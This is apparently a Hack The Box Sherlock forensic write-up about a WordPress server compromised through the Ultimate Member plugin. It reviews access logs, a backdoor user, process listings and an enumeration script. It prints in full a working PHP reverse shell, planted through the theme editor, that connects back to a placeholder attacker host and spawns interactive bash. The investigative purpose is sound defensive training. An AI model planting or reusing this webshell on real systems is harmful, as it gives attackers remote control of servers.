---
title: Ultimatum
tags:
  - htb
  - sherlock
  - soc
  - easy
---

# Sherlock Scenario

_One of the Forela WordPress servers was a target of notorious Threat Actors (TA). The website was running a blog dedicated to the Forela Social Club, where Forela employees can chat and discuss random topics. Unfortunately, it became a target of a threat group. The SOC team believe this was due to the blog running a vulnerable plugin. The IT admin already followed the acquisition playbook and triaged the server for the security team. Ultimately (no pun intended) it is your responsibility to investigate the incident. Step in and confirm the culprits behind the attack and restore this important service within the Forela environment._

Before we start, we need to extract the .tar.gz files of the given findings, so that we can analyse all the findings.

find . -type f -iname "*.tar.gz" -exec tar xzfv {} \;

This command will extract all archives to `./catscale_out`

## **Q1)** Which security scanning tool was utilized by the attacker to fingerprint the blog website?
```
❯ head var/log/apache2/access.log  
212.224.107.86 - - [08/Aug/2023:08:19:26 +0000] "GET /appspec.yml HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36"  
212.224.107.86 - - [08/Aug/2023:08:19:27 +0000] "GET /db/robomongo.json HTTP/1.1" 404 454 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"  
212.224.107.86 - - [08/Aug/2023:08:19:29 +0000] "GET /appspec.yaml HTTP/1.1" 404 454 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F"  
212.224.107.86 - - [08/Aug/2023:08:19:30 +0000] "GET /robomongo.json HTTP/1.1" 404 454 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"  
ATTACKER_IP - - [08/Aug/2023:08:21:27 +0000] "GET / HTTP/1.1" 200 11596 "http://3.110.136.25/" "Scanner v1.2.3 (https://scanner.com/trimmed-super-scenner)"  
ATTACKER_IP - - [08/Aug/2023:08:21:29 +0000] "GET / HTTP/1.1" 200 11596 "http://3.110.136.25/" "Scanner v1.2.3 (https://scanner.com/trimmed-super-scenner)"  
ATTACKER_IP - - [08/Aug/2023:08:21:29 +0000] "HEAD / HTTP/1.1" 200 202 "http://3.110.136.25/" "Scanner v1.2.3 (https://scanner.com/trimmed-super-scenner)"  
ATTACKER_IP - - [08/Aug/2023:08:21:29 +0000] "GET /2397006.html HTTP/1.1" 404 435 "http://3.110.136.25/" "Scanner v1.2.3 (https://scanner.com/trimmed-super-scenner)"  
ATTACKER_IP - - [08/Aug/2023:08:21:31 +0000] "HEAD /robots.txt HTTP/1.1" 404 140 "http://3.110.136.25/" "Scanner v1.2.3 (https://scanner.com/trimmed-super-scenner)"  
ATTACKER_IP - - [08/Aug/2023:08:21:31 +0000] "HEAD /fantastico_fileslist.txt HTTP/1.1" 404 140 "http://3.110.136.25/" "Scanner v1.2.3 (https://scanner.com/trimmed-super-scenner)"
```
## Q2) Which CVE was exploited by the attacker?
```
❯ sed -n "2218,2228p" var/log/apache2/access.log  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/css/um-fonticons-ii.css?ver=2.6.4 HTTP/1.1" 200 6268 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/css/um-fonticons-fa.css?ver=2.6.4 HTTP/1.1" 200 5113 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/css/um-account.css?ver=2.6.4 HTTP/1.1" 200 1468 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/js/pickadate/picker.date.js?ver=2.6.4 HTTP/1.1" 200 10973 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/js/um-profile.min.js?ver=2.6.4 HTTP/1.1" 200 1299 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/css/pickadate/default.date.css?ver=2.6.4 HTTP/1.1" 200 1598 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/css/um-old-default.css?ver=2.6.4 HTTP/1.1" 200 1523 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/css/um-modal.css?ver=2.6.4 HTTP/1.1" 200 1273 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/css/simplebar.css?ver=2.6.4 HTTP/1.1" 200 1354 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/js/um-gdpr.min.js?ver=2.6.4 HTTP/1.1" 200 604 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/css/um-styles.css?ver=2.6.4 HTTP/1.1" 200 4613 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
```
According to the logs, Wordpress’s Ultimate Member plugin is being used.

[https://www.cvedetails.com/](https://www.cvedetails.com/) will help us to search the CVE.

![](https://miro.medium.com/v2/resize:fit:700/1*YQX0gT6W2a_meleOAbgWFw.png)

## Q3) What was the IP Address utilized by the attacker to exploit the CVE?

acces.log again gives us information about the attacker.
```
212.224.107.86 - - [08/Aug/2023:08:19:26 +0000] "GET /appspec.yml HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36"  
212.224.107.86 - - [08/Aug/2023:08:19:27 +0000] "GET /db/robomongo.json HTTP/1.1" 404 454 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"  
212.224.107.86 - - [08/Aug/2023:08:19:29 +0000] "GET /appspec.yaml HTTP/1.1" 404 454 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F"  
212.224.107.86 - - [08/Aug/2023:08:19:30 +0000] "GET /robomongo.json HTTP/1.1" 404 454 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"  
ATTACKER_IP - - [08/Aug/2023:08:21:27 +0000] "GET / HTTP/1.1" 200 11596 "http://3.110.136.25/" "Scanner v1.2.3 (https://scanner.com/trimmed-super-scenner)"  
ATTACKER_IP - - [08/Aug/2023:08:21:29 +0000] "GET / HTTP/1.1" 200 11596 "http://3.110.136.25/" "Scanner v1.2.3 (https://scanner.com/trimmed-super-scenner)"  
ATTACKER_IP - - [08/Aug/2023:08:21:29 +0000] "HEAD / HTTP/1.1" 200 202 "http://3.110.136.25/" "Scanner v1.2.3 (https://scanner.com/trimmed-super-scenner)"  
ATTACKER_IP - - [08/Aug/2023:08:21:29 +0000] "GET /2397006.html HTTP/1.1" 404 435 "http://3.110.136.25/" "Scanner v1.2.3 (https://scanner.com/trimmed-super-scenner)"  
ATTACKER_IP - - [08/Aug/2023:08:21:31 +0000] "HEAD /robots.txt HTTP/1.1" 404 140 "http://3.110.136.25/" "Scanner v1.2.3 (https://scanner.com/trimmed-super-scenner)"  
ATTACKER_IP - - [08/Aug/2023:08:21:31 +0000] "HEAD /fantastico_fileslist.txt HTTP/1.1" 404 140 "http://3.110.136.25/" "Scanner v1.2.3 (https://scanner.com/trimmed-super-scenner)"
```
## Q4) What is the name of the backdoor user added to the blog as part of the exploitation process?

After the attacker realises his goals, he continues his attack from a different IP address, we can find out where he placed the backdoor from the records where the exact IP address changed.
```
❯ sed -n "2209,2219p" var/log/apache2/access.log  
ATTACKER_IP - - [08/Aug/2023:08:32:50 +0000] "POST /xmlrpc.php HTTP/1.1" 200 420 "http://3.110.136.25/" "WPScan v3.8.24 (https://wpscan.com/wordpress-security-scanner)"  
ATTACKER_IP - - [08/Aug/2023:08:33:58 +0000] "GET //wp-content/plugins/ultimate-member/readme.txt HTTP/1.1" 200 38499 "-" "python-requests/2.28.1"  
ATTACKER_IP - - [08/Aug/2023:08:33:59 +0000] "GET //index.php/register/ HTTP/1.1" 301 295 "-" "Some Offsec Agent"  
ATTACKER_IP - - [08/Aug/2023:08:33:59 +0000] "GET /index.php/register/ HTTP/1.1" 200 11367 "-" "Some Offsec Agent"  
ATTACKER_IP - - [08/Aug/2023:08:33:59 +0000] "POST //index.php/register/ HTTP/1.1" 302 951 "-" "Some Offsec Agent"  
ATTACKER_IP - - [08/Aug/2023:08:34:00 +0000] "GET /index.php/user/TRIMMED_PATH_NAME/ HTTP/1.1" 200 14335 "-" "Some Offsec Agent"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:10 +0000] "GET / HTTP/1.1" 200 11652 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:10 +0000] "GET /wp-includes/blocks/navigation/style.min.css?ver=6.2.2 HTTP/1.1" 200 2573 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:11 +0000] "GET /wp-includes/js/wp-emoji-release.min.js?ver=6.2.2 HTTP/1.1" 200 5390 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/css/um-fonticons-ii.css?ver=2.6.4 HTTP/1.1" 200 6268 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/css/um-fonticons-fa.css?ver=2.6.4 HTTP/1.1" 200 5113 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
```
## Q5,6,7,9)
After the exploit, the SOC team observed that the attacker’s IP address changed and from the logs, it seems that the attacker manually explored the website after logging in. The SOC team believes that the previous IP seen during exploitation was a public cloud IP. What is the IP Address the attacker used after logging in to the site? The SOC team has suspicions that the attacker added a web shell for persistent access. Confirm the full path of the web shell on the server. What was the value of the $shell variable in the web shell? The SOC team believes that the attacker utilized the webshell to get RCE on the server. Can you confirm the C2 IP and Port?

The SOC team has suspicions that the attacker added a web shell for persistent access. Confirm the full path of the web shell on the server.
```
❯ sed -n "2754,2765p" var/log/apache2/access.log  
ATTACKER_IP_2 - - [08/Aug/2023:08:56:42 +0000] "GET /wp-admin/theme-editor.php?file=patterns%2Fhidden-404.php&theme=twentytwentythree HTTP/1.1" 200 11424 "http://3.110.136.25/wp-admin/theme-editor.php?file=templates%2F404.html&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:57:15 +0000] "GET /wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree HTTP/1.1" 200 11554 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-404.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
212.224.107.86 - - [08/Aug/2023:08:57:15 +0000] "GET / HTTP/1.1" 200 11615 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"  
212.224.107.86 - - [08/Aug/2023:08:57:18 +0000] "GET /public/config.js HTTP/1.1" 404 454 "-" "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"  
212.224.107.86 - - [08/Aug/2023:08:57:21 +0000] "GET /config.js HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"  
ATTACKER_IP_2 - - [08/Aug/2023:08:57:47 +0000] "GET /wp-admin/theme-editor.php?file=patterns%2Fhidden-404.php&theme=twentytwentythree HTTP/1.1" 200 11426 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:57:50 +0000] "GET /wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree HTTP/1.1" 200 11554 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-404.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
3.110.136.25 - - [08/Aug/2023:08:58:02 +0000] "GET /wp-admin/theme-editor.php?theme=twentytwentythree&file=patterns%2Fhidden-comments.php&wp_scrape_key=bfc415652d48bcf10671c0948544fee8&wp_scrape_nonce=771812714 HTTP/1.1" 200 12139 "-" "WordPress/6.2.2; http://3.110.136.25"  
3.110.136.25 - - [08/Aug/2023:08:58:02 +0000] "GET /?wp_scrape_key=bfc415652d48bcf10671c0948544fee8&wp_scrape_nonce=771812714 HTTP/1.1" 200 12974 "-" "WordPress/6.2.2; http://3.110.136.25"  
ATTACKER_IP_2 - - [08/Aug/2023:08:58:02 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 592 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:58:07 +0000] "GET /wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,code-editor,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-poi&load%5Bchunk_1%5D=nter,widgets,site-icon,l10n,buttons,wp-auth-check&ver=6.2.2 HTTP/1.1" 200 99649 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"  
ATTACKER_IP_2 - - [08/Aug/2023:08:58:16 +0000] "GET /wp-admin/plugins.php HTTP/1.1" 200 11518 "http://3.110.136.25/wp-admin/theme-editor.php?file=patterns%2Fhidden-comments.php&theme=twentytwentythree" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
```
When the attacker enters the Wordperss admin panel, he may be trying to edit the PHP file from the editor, trying to inject the malicious code block. Let’s examine this file.
```
❯ sed -n "656374,656491p" Misc/ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt  
  
==> /path/to/webshell/some-file.php <==  
<?php  
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php  
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net  
  
set_time_limit (0);  
$VERSION = "1.0";  
$ip = 'ATTACKER_IP';  
$port = ATTACKER_PORT;  
$chunk_size = 1400;  
$write_a = null;  
$error_a = null;  
$shell = 'uname -a; w; id; /bin/bash -i';  
$daemon = 0;  
$debug = 0;  
  
if (function_exists('pcntl_fork')) {  
 $pid = pcntl_fork();  
   
 if ($pid == -1) {  
  printit("ERROR: Can't fork");  
  exit(1);  
 }  
   
 if ($pid) {  
  exit(0);  // Parent exits  
 }  
 if (posix_setsid() == -1) {  
  printit("Error: Can't setsid()");  
  exit(1);  
 }  
  
 $daemon = 1;  
} else {  
 printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");  
}  
  
chdir("/");  
  
umask(0);  
  
// Open reverse connection  
$sock = fsockopen($ip, $port, $errno, $errstr, 30);  
if (!$sock) {  
 printit("$errstr ($errno)");  
 exit(1);  
}  
  
$descriptorspec = array(  
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from  
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to  
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to  
);  
  
$process = proc_open($shell, $descriptorspec, $pipes);  
  
if (!is_resource($process)) {  
 printit("ERROR: Can't spawn shell");  
 exit(1);  
}  
  
stream_set_blocking($pipes[0], 0);  
stream_set_blocking($pipes[1], 0);  
stream_set_blocking($pipes[2], 0);  
stream_set_blocking($sock, 0);  
  
printit("Successfully opened reverse shell to $ip:$port");  
  
while (1) {  
 if (feof($sock)) {  
  printit("ERROR: Shell connection terminated");  
  break;  
 }  
  
 if (feof($pipes[1])) {  
  printit("ERROR: Shell process terminated");  
  break;  
 }  
  
 $read_a = array($sock, $pipes[1], $pipes[2]);  
 $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);  
  
 if (in_array($sock, $read_a)) {  
  if ($debug) printit("SOCK READ");  
  $input = fread($sock, $chunk_size);  
  if ($debug) printit("SOCK: $input");  
  fwrite($pipes[0], $input);  
 }  
  
 if (in_array($pipes[1], $read_a)) {  
  if ($debug) printit("STDOUT READ");  
  $input = fread($pipes[1], $chunk_size);  
  if ($debug) printit("STDOUT: $input");  
  fwrite($sock, $input);  
 }  
  
 if (in_array($pipes[2], $read_a)) {  
  if ($debug) printit("STDERR READ");  
  $input = fread($pipes[2], $chunk_size);  
  if ($debug) printit("STDERR: $input");  
  fwrite($sock, $input);  
 }  
}  
  
fclose($sock);  
fclose($pipes[0]);  
fclose($pipes[1]);  
fclose($pipes[2]);  
proc_close($process);  
  
function printit ($string) {  
 if (!$daemon) {  
  print "$string\n";  
 }  
}  
  
?>
```
_Note: The attack used the webshell written by PentestMoney_ [_https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php_](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

## Q8) What is the size of the webshell in bytes?

```
❯ sed -n "656376,656491p" Misc/ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt> /tmp/shell.php;du /tmp/shell.php -hb  
2592 /tmp/shell.php
```

## Q10) What is the process ID of the process which enabled the Threat Actor (TA) to gain hands-on access to the server?
```
❯ sed -n "112,124p" Process_and_Network/ip-172-31-11-131-20230808-0937-processes-axwwSo.txt  
www-data  234415   12221 223544 52592 ?        S    08:43 00:00:00 /usr/sbin/apache2 -k start  
www-data  234471   12221 224360 49248 ?        S    08:49 00:00:01 /usr/sbin/apache2 -k start  
www-data  234473   12221 224372 51404 ?        S    08:49 00:00:00 /usr/sbin/apache2 -k start  
www-data  234474   12221 222240 49872 ?        S    08:49 00:00:00 /usr/sbin/apache2 -k start  
www-data  234477   12221 221792 50768 ?        S    08:49 00:00:00 /usr/sbin/apache2 -k start  
www-data  234478   12221 221768 51124 ?        S    08:49 00:00:00 /usr/sbin/apache2 -k start  
www-data  234499   12221 223496 51096 ?        S    08:50 00:00:00 /usr/sbin/apache2 -k start  
www-data  234502   12221 221252 48680 ?        S    08:51 00:00:00 /usr/sbin/apache2 -k start  
www-data  234503   12221 221252 49280 ?        S    08:51 00:00:00 /usr/sbin/apache2 -k start  
www-data  234509   12221 221116 48616 ?        S    08:53 00:00:00 /usr/sbin/apache2 -k start  
www-data  234517  234471   2616   596 ?        S    09:01 00:00:00 sh -c uname -a; w; id; /bin/bash -i  
www-data  PID HERE  234517   4248  3444 ?      S    09:01 00:00:00 /bin/bash -i  
root      234741       2      0     0 ?        I    09:07 00:00:00 [kworker/0:0-events]
```
## Q10) What is the name of the script/tool utilized as part of internal enumeration and finding privilege escalation paths on the server?
```
❯ cat Misc/ip-172-31-11-131-20230808-0937-dev-dir-files-hashes.txt  
26bbf01183c7aacf331f9ecdf694d44122e1a089  /dev/shm/SuperPowerfulLinuxScanner.sh
```